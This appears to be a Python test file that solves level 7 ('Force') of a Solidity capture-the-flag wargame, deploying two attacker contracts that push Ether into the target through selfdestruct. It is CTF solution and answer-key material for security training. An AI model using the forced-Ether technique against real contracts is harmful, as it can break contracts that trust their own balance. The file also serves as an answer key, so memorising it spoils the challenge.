from wake.testing import *
from tests.level_service import LevelService
from pytypes.contracts.i07_force import Force
from pytypes.contracts.attacker.i07_transfer import ForceTransfer, FasterForceTransfer

@default_chain.connect()
def test_level_07():
    service = LevelService(default_chain)
    contract = service.deploy_level_07()
    do_level_07_solution(contract)
    service.check_level_07(contract)

def do_level_07_solution(contract: Force):
    # Problem: Selfdestruct and minting transfer Ether directly 
    attacker1 = ForceTransfer.deploy()
    attacker1.push(contract, value=30)
    attacker2 = FasterForceTransfer.deploy(contract, value=100)
